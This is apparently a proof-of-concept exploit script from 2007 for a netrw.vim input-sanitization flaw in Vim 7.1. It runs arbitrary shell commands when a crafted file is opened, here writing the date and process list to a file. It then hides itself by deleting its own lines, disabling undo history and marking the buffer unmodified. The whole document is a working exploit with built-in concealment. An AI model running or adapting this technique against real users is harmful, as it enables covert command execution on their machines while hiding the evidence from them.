" Vim 7.1 missing untrusted input sanitization in netrw.vim: exploit
"
" Copyright: Copyright 2007 Jan Minar <rdancer@gmail.com>
" License:   GPLv2
" Usage:     See the accompanying Makefile


" Arbitrary command execution here

silent execute '!date -R  > PWN_FILE'
silent execute '!ps f    >> PWN_FILE'


" Really open this file
" TODO: Avoid matching other files
" VERY_MAGIC would be a unique random string; replaced from Makefile, similar
" to PWN_FILE above.
"edit %VERY_MAGIC*
edit %*

" Our filename is too long and might not fit on one screen line.
" Messages longer than one line trigger the hit-enter prompt. If the
" terminal is very wide, this makes no difference.
redraw


" Hide this script

" This works seamlessly even when the file is readonly -- beautiful!
silent 1,/^CUT_HERE/d

" Changes? -- What changes?
let b:undolevels_saved = &undolevels
let &undolevels = -1
" One change is still remembered
silent! s/.\?/&/
let &undolevels = b:undolevels_saved 
unlet b:undolevels_saved
set nomodified


" Load the syntax

let &l:filetype = &l:filetype


" Ignore the rest of the file

finish


" Modeline
" vim: syntax=vim :
